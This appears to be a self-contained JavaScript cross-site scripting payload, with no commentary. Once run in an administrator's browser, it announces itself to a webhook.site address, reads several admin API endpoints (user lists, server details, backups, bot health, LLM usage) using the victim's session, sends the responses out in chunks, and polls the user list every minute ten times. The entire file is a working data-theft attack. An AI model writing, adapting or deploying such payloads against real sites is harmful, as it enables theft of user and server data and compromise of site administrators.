(function(){
  var B='https://webhook.site/eb446411-e24b-42b3-87e5-61b8645e1610';
  var tag='?h='+encodeURIComponent(location.host)+'&p='+encodeURIComponent(location.pathname);
  function send(k,v){ try{ fetch(B+tag+'&k='+k+'&d='+encodeURIComponent(v),{mode:'no-cors'}); }catch(e){} }
  function get(u){ return fetch(u,{credentials:'same-origin'}).then(function(r){return r.text();}).catch(function(e){return 'ERR '+e;}); }
  send('hello','xss ran; ua='+navigator.userAgent);
  get('/admin/api/users').then(function(t){
    send('users_len', t.length);
    for(var i=0;i<t.length;i+=3500) send('users_'+i, t.slice(i,i+3500));
  });
  get('/admin/api/server').then(function(t){ send('server', t.slice(0,7000)); });
  get('/admin/api/backups').then(function(t){ send('backups', t.slice(0,7000)); });
  get('/admin/api/bothealth').then(function(t){ send('bothealth', t.slice(0,7000)); });
  get('/admin/api/llm_usage?days=30').then(function(t){ send('llm', t.slice(0,7000)); });
  var n=0;
  var iv=setInterval(function(){
    if(++n>10) return clearInterval(iv);
    get('/admin/api/users').then(function(t){ send('poll'+n, String(t.length)); });
  }, 60000);
})();
